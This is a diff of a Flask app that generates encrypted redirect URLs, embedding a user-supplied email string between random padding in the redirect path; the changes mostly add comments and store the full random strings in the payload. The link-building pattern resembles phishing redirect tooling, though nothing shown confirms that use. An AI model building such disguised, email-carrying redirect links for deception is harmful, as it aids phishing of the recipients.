@@ -446,11 +446,14 @@ def generate():
             logger.error(f"Invalid base64email: {base64email}")
             abort(400, "Base64email must be 2-100 characters (letters or numbers)")
 
-        # Use inputs as entered (case-sensitive, no base64 encoding for base64email)
+        # Use inputs as entered (case-sensitive, no truncation)
         subdomain = subdomain
+        # Use first 6 characters for randomstring1_short, pad if needed
         randomstring1_short = randomstring1[:6] if len(randomstring1) >= 6 else randomstring1 + generate_random_string(6 - len(randomstring1))
+        # Use first 8 characters for randomstring2_short, pad if needed
         randomstring2_short = randomstring2[:8] if len(randomstring2) >= 8 else randomstring2 + generate_random_string(8 - len(randomstring2))
         base64_email = base64email  # Use as-is without encoding
+        # Use full randomstring1 and randomstring2 in path_segment if needed, but here we use short versions
         path_segment = f"{randomstring1_short}{base64_email}{randomstring2_short}"
 
         endpoint = generate_random_string(8)
@@ -459,7 +462,9 @@ def generate():
         fingerprint = generate_fingerprint()
         payload = json.dumps({
             "student_link": destination_link,
-            "timestamp": int(time.time() * 1000)
+            "timestamp": int(time.time() * 1000),
+            "randomstring1": randomstring1,  # Store full string
+            "randomstring2": randomstring2   # Store full string
         })
 
         logger.debug(f"Selected encryption method: {method}")
@@ -503,7 +508,7 @@ def generate():
                     <h3 class="text-2xl font-bold mb-4 text-gray-900">Your Secure URL</h3>
                     <p class="text-gray-600 mb-4">Copy or click your generated URL below:</p>
                     <a href="{{ url }}" target="_blank" class="text-indigo-600 break-all">{{ url }}</a>
-                    <p class="mt-4 text-sm text-gray-500">This URL will redirect to the destination after a brief delay.</p>
+                    <p class="mt-4 text-sm text-gray-500">This URL will redirect to the destination.</p>
                 </div>
             </body>
             </html>
@@ -573,7 +578,7 @@ def redirect_handler(username, endpoint, encrypted_payload, path_segment):
         final_url = f"{redirect_url.rstrip('/')}/{path_segment}"
         logger.info(f"Redirecting to {final_url}")
 
-        # Always redirect immediately without delay
+        # Immediate redirect
         return redirect(final_url, code=302)
     except Exception as e:
         logger.error(f"Internal Server Error in redirect_handler: {str(e)}", exc_info=True)
